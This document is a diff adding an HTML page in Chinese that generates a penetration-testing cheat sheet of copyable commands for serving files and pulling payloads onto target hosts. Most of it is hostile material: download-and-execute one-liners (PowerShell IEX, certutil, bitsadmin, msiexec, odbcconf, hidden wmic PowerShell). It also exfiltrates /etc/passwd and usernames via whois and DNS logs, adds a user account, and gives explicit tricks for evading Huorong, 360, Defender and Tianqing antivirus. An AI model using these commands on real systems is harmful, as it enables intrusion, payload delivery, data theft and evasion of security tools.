@@ -1,0 +1,372 @@
+<html>
+<head>
+<meta charset="utf-8">
+<title>快速开启文件上传下载</title>
+</head>
+<body>
+            <div class="s_clear">
+                <div style="border-top:1px dotted #666666;"></div>
+				<center><b><font color="#0000ff">开启http服务和文件下载</font></b></center>
+                <script>
+                    function disableScrolling(){
+    var x=window.scrollX;
+    var y=window.scrollY;
+    window.onscroll=function(){window.scrollTo(x, y);};
+}
+
+function enableScrolling(){
+    window.onscroll=function(){};
+}
+
+function copy(item_id) {
+  disableScrolling();
+  var copyText = document.getElementById(item_id).textContent;
+  const textArea = document.getElementById('txt');
+  textArea.textContent = copyText;
+  textArea.select();
+  document.execCommand("copy");
+  enableScrolling();
+  return false;
+}
+</script>
+                <style type="text/css">
+                button {
+
+                    padding: 0 5px;
+                    margin: 0;
+                }
+
+                textarea {
+                    position: fixed;
+                    left: -100%;
+                }
+
+                pre {
+                    font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
+                    font-size: 12px;
+                    background-color: #f6f8fa;
+                    overflow: auto;
+                    border: 1px solid #898989;
+                    padding: 5px;
+                }
+
+                .main_shell {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                    padding: 15px;
+                    border: 1px solid #898989;
+                }
+
+                .main_shell h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+                .main_bountytips {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                }
+
+                .main_bountytips h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+
+                .tips {
+                    padding-bottom: 15px;
+                    padding-top: 10px;
+                    border-bottom: 1px dashed #999;
+
+                }
+
+                .tips ul {
+                    display: block;
+                    list-style-type: disc;
+                    margin-block-start: 1em;
+                    margin-block-end: 1em;
+                    margin-inline-start: 0px;
+                    margin-inline-end: 0px;
+                    padding-inline-start: 15px;
+                }
+
+                .tips ul li {
+                    display: list-item;
+                    text-align: -webkit-match-parent;
+                    list-style-type: square;
+                }
+
+                .tips .tips_title {
+                    font-size: 14px;
+                    padding-bottom: 10px;
+                }
+
+                .tips blockquote {
+                    padding: 0 15px;
+                    margin: 0;
+                    color: #666;
+                    border-left: 4px solid #ddd;
+                }
+
+                .tips2 {
+                    padding-top: 17px;
+                }
+
+                .tips2 blockquote {
+                    padding: 0 15px;
+                    margin: 0;
+                    color: #666;
+                    border-left: 4px solid #ddd;
+                }
+
+                input[type=text] {
+                    border: 1px solid #898989;
+                    font-size: 12px;
+                    width: 140px;
+                }
+                </style>
+                <br>
+                <div class="main_shell">
+                    IP: <input type="text" id="ip" value="127.0.0.1" name="ip">
+                    Port: <input type="text" id="port" value="8080" name="port">
+                    Source File: <input type="text" id="Source" value="ms10-051.exe" name="Source">
+                    Destination File: <input type="text" id="name" value="exploit.exe" name="name">
+                    <input type="submit" value="Change" onclick="myFunction()">
+                    <input type="reset" value="Reset" onclick="myFunction2()">
+                    <script>
+                    function myFunction() {
+                        var ip = document.getElementById("ip").value;
+                        var port = document.getElementById("port").value;
+                        var Source = document.getElementById("Source").value;
+                        var name = document.getElementById("name").value;
+                        console.log(ip);
+                        console.log(port);
+                        console.log(Source);
+                        console.log(name);
+                        var html = document.body.innerHTML;
+                        html = html.replace(/127\.0\.0\.1/g, ip);
+                        html = html.replace(/8080/g, port);
+                        html = html.replace(/ms10-051\.exe/g, Source);
+                        html = html.replace(/exploit\.exe/g, name);
+                        document.body.innerHTML = html;
+                    }
+
+                    function myFunction2() {
+                        location.reload();
+                    }
+                    </script>
+                    <textarea id="txt"></textarea>
+                    <div class="main_bountytips">
+                    <div class="tips">
+                    </div>
+                    <div class="tips">
+                        <div class="tips_title"><b><font color="#ff0000"><h3>快速开启一个HTTP Server</h3></font></b></div>
+                        Python HTTP:
+                        <pre id="cmd001">python -m SimpleHTTPServer 8080</pre>
+                        <button onclick="copy('cmd001')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python3 HTTP:
+                        <pre id="cmd002">python3 -m http.server 8080</pre>
+                        <button onclick="copy('cmd002')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python FTP:
+                        <pre id="cmd003">python -m pyftpdlib -p 8080</pre>
+                        <button onclick="copy('cmd003')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python3 SMB:
+                        <pre id="cmd004">python3 impacket-smbserver.py files . -port 8080</pre>
+                        <button onclick="copy('cmd004')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        PHP 5.4+:
+                        <pre id="cmd016">php -S 0.0.0.0:8080</pre>
+                        <button onclick="copy('cmd016')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Ruby:
+                        <pre id="cmd017">ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8080, :DocumentRoot => Dir.pwd).start'</pre>
+                        <button onclick="copy('cmd017')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Ruby 1.9.2+:
+                        <pre id="cmd018">ruby -run -e httpd . -p 8080</pre>
+                        <button onclick="copy('cmd018')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        busybox httpd:
+                        <pre id="cmd019">busybox httpd -f -p 8080</pre>
+                        <button onclick="copy('cmd019')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        <div class="tips_title"><b><font color="#ff0000"><h3>快速进行文件下载Download the files</h3></font></b></div>
+                        PowerShell - IWR:
+                        <pre id="cmd005">powershell.exe -Command "Invoke-WebRequest -Uri http://127.0.0.1:8080/ms10-051.exe -OutFile exploit.exe"</pre>
+                        <button onclick="copy('cmd005')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        PowerShell - IEX:
+                        <pre id="cmd006">powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/ms10-051.exe', exploit.exe)"</pre>
+                        <button onclick="copy('cmd006')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        CMD - Certutil:
+                        <pre id="cmd007">certutil.exe -urlcache -split -f http://127.0.0.1:8080/ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd007')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        CMD - SMB:
+                        <pre id="cmd008">copy \\127.0.0.1\files\ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd008')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux - wget:
+                        <pre id="cmd009">wget http://127.0.0.1:8080/ms10-051.exe -O exploit.exe</pre>
+                        <button onclick="copy('cmd009')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux - curl:
+                        <pre id="cmd010">curl http://127.0.0.1:8080/ms10-051.exe -o exploit.exe</pre>
+                        <button onclick="copy('cmd010')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows Bitsadmin:
+                        <pre id="cmd011">bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/ms10-051.exe" c:\\exploit.exe</pre>
+                        <button onclick="copy('cmd011')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows msiexec:
+                        <pre id="cmd012">msiexec /q /i http://127.0.0.1:8080/ms10-051.exe</pre>
+                        <button onclick="copy('cmd012')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows msiexec:
+                        <pre id="cmd020">msiexec /q /%os:~1,1%http://127.0.0.1:8080/ms10-051.exe</pre>
+                        <button onclick="copy('cmd020')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows PowerShell:
+						在前台运行。Windows wmic可在后台运行
+                        <pre id="cmd028">powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/payload.ps1')</pre>
+                        <button onclick="copy('cmd028')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows odbcconf(执行包含特殊功能的DLL，这种DLL文件不需要使用.dll后缀，而且可以通过UNC/WebDAV下载):
+                        <pre id="cmd118">odbcconf /s /a {regsvr \\http://127.0.0.1:8080/\folder\payload_dll.txt}</pre>
+                        <button onclick="copy('cmd118')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python Download:
+                        <pre id="cmd013">python -c "import urllib2; exec urllib2.urlopen('http://127.0.0.1:8080/ms10-051.exe').read();"</pre>
+                        <button onclick="copy('cmd013')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows IPC$:
+                        <pre id="cmd014">copy \127.0.0.1\c$\ms10-051.exe C:\exploit.exe</pre>
+                        <button onclick="copy('cmd014')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux whois:
+                        <pre id="cmd015">whois -h 127.0.0.1 -p 8080 `cat /etc/passwd | base64`
+nc -lvvp 8080 | sed "s/ //g" | base64 -d</pre>
+                    </div>
+                    <div class="tips">
+                        CertReq.exe 下载:
+                        <pre id="cmd015">CertReq -Post -config http://127.0.0.1:8080/ c:\windows\win.ini output.txt</pre>
+                    </div>
+                    <div class="tips">
+                        CertReq.exe 上传:
+                        <pre id="cmd015">CertReq -Post -config http://127.0.0.1:8080/ c:\windows\win.ini and show response in terminal</pre>
+                    </div>
+                    <div class="tips">
+                        Windows CertUtil.exe
+                        <pre id="cmd015"><code>#准备：base64+url编码的webshell.jsp，CertUtil进行解码:
+#CertUtil解码:
+CertUtil -decode Base64编码文件名(可包含路径) 解码后生成的文件名(可包含路径)
+#或者下载其他文件：
+certutil -urlcache -split -f http://127.0.0.1:8000/reverse.exe c:/Windows/Temp/reserver.exe
+#注意：以下命令是在Win7及其以后的机器使用。但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令。</code></pre>
+                    </div>
+					<div class="tips">
+                        Windows wmic:
+						在后台运行。wmic进行powershell下载执行，如cs的powershell。
+                        <pre id="cmd015">wmic PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xxx.com/payload.ps1'))\"" </pre>
+                    </div>
+					<div class="tips">
+                        浏览器 下载:
+                        <pre id="cmd015">
+1、前提条件：
+一般浏览器下载默认路径为： C:\Users\当前用户名字\Downloads\ 
+
+通过dnslog外带当年用户名 
+ping %USERNAME%.4e4ppf.dnslog.cn 
+如果是powershell则 
+cmd /c ping %USERNAME%.xb1y2y.dnslog.cn
+2、使用默认浏览器下载 
+pcalua -m -a http://192.168.31.205/shell.rar
+3、其他浏览器 
+start msedge http://192.168.31.205/shell.rar
+start chrome http://192.168.31.205/shell.rar
+start firefox http://192.168.31.205/shell.rar
+4、下载之后进行重命名
+rename shell.rar shell.exe
+5、或者直接：
+start msedge http://192.168.31.205/shell.rar && ping -n 10 127.0.0.1 >NUL && rename shell.rar shell.exe 
+						</pre>
+                    </div>
+					<div class="tips">
+                        <div class="tips_title"><b><font color="#ff0000"><h3>绕过杀毒软件进行文件下载Download the files</h3></font></b></div>
+                        绕过火绒：
+                        <pre id="cmd005">
+1、远程下载
+"c""e""r""t""u""t""i""l" -"u""r""l""c""a""c""h""e" -split -f https://url/1.exe 1.exe
+2、添加用户
+copy c:\windows\system32\net1.exe aaa.txt
+aaa.txt user xxxx 123456 /add
+						</pre>
+                    </div>
+					<div class="tips">
+                        bypass360：
+                        <pre id="cmd005">
+360对 certutil 运行参数进行了动态检测，只要动态执行后的参数有 -urlcache 就拦截。那么把certutil复制换一个名字再去运行
+copy c:\windows\system32\certutil.exe c.exe
+c -urlcache -split -f http://192.168.31.205/geek.exe
+						</pre>
+                    </div>
+					<div class="tips">
+                        Defender 绕过：
+                        <pre id="cmd005">certutil -url""""cache -split -f  http://192.168.31.205/geek.exe</pre>
+                    </div>
+					<div class="tips">
+                        天擎绕过：
+                        <pre id="cmd005">copy c:\windows\system32\certutil.exe c.exeverpatch.exe c.exe /s InternalName ""certutil -urlcache  -split -f http://xxx.com/dns.exe</pre>
+                    </div>
+					<div class="tips">
+                        其他绕过：
+                        <pre id="cmd005">
+https://mp.weixin.qq.com/s/-rN-rsnYRSKuJr5BkaRnBg
+FTP 命令行下载 https://blog.csdn.net/qq_57163366/article/details/129438241
+						</pre>
+                    </div>
+					<!---------------------------------------------------------------------------------------------->
+                    <div class="tips">
+                    <blockquote>
+						<p>参考File Download Generator：<a href="https://forum.ywhack.com/bountytips.php?download" target="_blank">https://file-downloads.com/</a></p>
+                    </blockquote>
+                    </div>
+                </div>
+                </div>
+                <br>
+				
+                </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
